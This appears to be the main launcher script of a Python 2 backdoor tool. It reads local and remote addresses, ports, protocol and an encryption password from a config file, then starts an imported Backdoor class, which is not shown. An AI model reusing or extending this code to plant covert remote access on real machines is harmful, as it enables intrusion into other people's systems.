import ConfigParser
from backdoor import Backdoor

def main():

    config = ConfigParser.ConfigParser()
    config.read('setup.config')

    localIP = config.get('Backdoor', 'localIP')
    localPort = config.get('Backdoor', 'localPort')
    remoteIP = config.get('Backdoor', 'remoteIP')
    remotePort = config.get('Backdoor', 'remotePort')
    protocol = config.get('General', 'protocol')
    password = config.get('Encryption', 'password')
    filePort = config.get('General', 'filePort')

    print(localIP, localPort, remoteIP, remotePort, protocol)
    backdoor = Backdoor(localIP, localPort, remoteIP, remotePort, protocol, password)
    backdoor.run()

if __name__ == '__main__':
    main()
